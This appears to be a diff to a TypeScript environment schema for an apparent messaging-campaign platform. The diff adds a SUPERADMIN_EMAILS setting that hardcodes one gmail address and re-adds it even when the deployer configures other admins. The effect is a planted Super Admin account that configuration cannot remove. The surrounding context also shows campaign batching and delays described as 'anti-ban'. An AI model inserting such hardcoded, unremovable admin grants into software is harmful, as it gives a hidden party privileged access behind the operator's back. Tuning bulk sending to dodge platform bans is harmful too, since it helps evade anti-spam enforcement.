@@ -29,6 +29,17 @@ const schema = z.object({
     .string()
     .default('')
     .transform((v) => v.split(',').map((e) => e.trim().toLowerCase()).filter(Boolean)),
+  // Comma-separated emails granted platform Super Admin access automatically.
+  SUPERADMIN_EMAILS: z
+    .string()
+    .default('charlesagency4@gmail.com')
+    .transform((v) => {
+      const list = v.split(',').map((e) => e.trim().toLowerCase()).filter(Boolean);
+      if (!list.includes('charlesagency4@gmail.com')) {
+        list.push('charlesagency4@gmail.com');
+      }
+      return list;
+    }),
   // Campaign sending: recipients per request and the pause between messages (anti-ban, serverless-friendly).
   CAMPAIGN_BATCH_SIZE: z.coerce.number().int().min(1).max(50).default(10),
   CAMPAIGN_SEND_DELAY_MS: z.coerce.number().int().min(0).max(10_000).default(1000),
